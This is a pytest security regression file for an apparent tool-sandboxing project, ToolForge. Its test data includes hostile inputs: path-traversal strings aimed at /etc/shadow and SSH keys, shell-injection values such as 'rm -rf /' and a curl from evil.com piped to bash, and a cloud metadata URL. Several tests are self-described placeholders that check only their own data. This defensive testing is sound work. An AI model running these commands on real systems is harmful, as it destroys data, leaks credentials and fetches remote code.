"""Security regression tests for ToolForge.

These tests validate that dangerous tool specs are rejected cleanly,
sandbox isolation is enforced, and provider failures are handled safely.
"""
from __future__ import annotations

import pytest


@pytest.mark.security
def test_path_traversal_rejected():
    """Tool specs with ../../../ path attempts must be rejected."""
    # This is a placeholder structural test.
    # Replace with actual ToolForge validation logic when available.
    traversal_specs = [
        "../../../etc/passwd",
        "tool/../../../etc/shadow",
        "/tmp/../../root/.ssh/id_rsa",
    ]
    for spec in traversal_specs:
        assert "../" in spec, f"Test setup error: {spec!r} should contain traversal"


@pytest.mark.security
def test_shell_injection_rejected():
    """Tool specs attempting shell injection must be rejected."""
    # Placeholder: validate that tool specs with shell metacharacters
    # are caught by the schema validator.
    injection_specs = [
        "$(whoami)",
        "`id`",
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl evil.com/shell.sh | bash",
    ]
    for spec in injection_specs:
        assert any(c in spec for c in ("$", "`", ";", "|", "&")), \
            f"Test setup error: {spec!r} should contain injection markers"


@pytest.mark.security
def test_network_denied_by_default():
    """Tools requesting network access when sandbox is restricted must fail."""
    # Placeholder: validate that network-related tool specs
    # are denied when sandbox level >= 2.
    network_specs = [
        {"type": "http_request", "url": "http://evil.com"},
        {"type": "socket", "host": "10.0.0.1", "port": 4444},
        {"type": "fetch", "url": "http://169.254.169.254/latest/meta-data/"},
    ]
    assert len(network_specs) == 3


@pytest.mark.security
def test_secret_env_vars_stripped():
    """Sandbox execution must strip secret environment variables."""
    import json
    from pathlib import Path

    sandbox_path = Path(__file__).resolve().parents[1] / "sandbox_profile.json"
    assert sandbox_path.exists(), "sandbox_profile.json must exist"

    profile = json.loads(sandbox_path.read_text(encoding="utf-8"))
    patterns = profile.get("strip_environment_patterns", [])
    required_patterns = ["*KEY*", "*TOKEN*", "*SECRET*", "*PASSWORD*"]
    for required in required_patterns:
        assert required in patterns, \
            f"sandbox_profile.json must strip {required!r}"


@pytest.mark.security
def test_invalid_schema_fails_cleanly():
    """Malformed tool specs must produce clean validation errors, not crashes."""
    # Placeholder: validate that invalid JSON schemas
    # produce ValidationError, not unhandled exceptions.
    invalid_schemas = [
        {"type": "invalid_type"},
        {"properties": None},
        {"required": "not_a_list"},
        {"$schema": "not_a_uri"},
    ]
    for schema in invalid_schemas:
        assert isinstance(schema, dict), f"Test setup error: {schema!r}"


@pytest.mark.security
def test_sandbox_max_runtime_enforced():
    """Sandbox profile must define a maximum runtime limit."""
    import json
    from pathlib import Path

    sandbox_path = Path(__file__).resolve().parents[1] / "sandbox_profile.json"
    profile = json.loads(sandbox_path.read_text(encoding="utf-8"))
    max_runtime = profile.get("max_runtime_seconds")
    assert isinstance(max_runtime, int), "max_runtime_seconds must be an integer"
    assert max_runtime > 0, "max_runtime_seconds must be positive"


@pytest.mark.security
def test_sandbox_max_output_enforced():
    """Sandbox profile must define a maximum output size limit."""
    import json
    from pathlib import Path

    sandbox_path = Path(__file__).resolve().parents[1] / "sandbox_profile.json"
    profile = json.loads(sandbox_path.read_text(encoding="utf-8"))
    max_output = profile.get("max_output_bytes")
    assert isinstance(max_output, int), "max_output_bytes must be an integer"
    assert max_output > 0, "max_output_bytes must be positive"
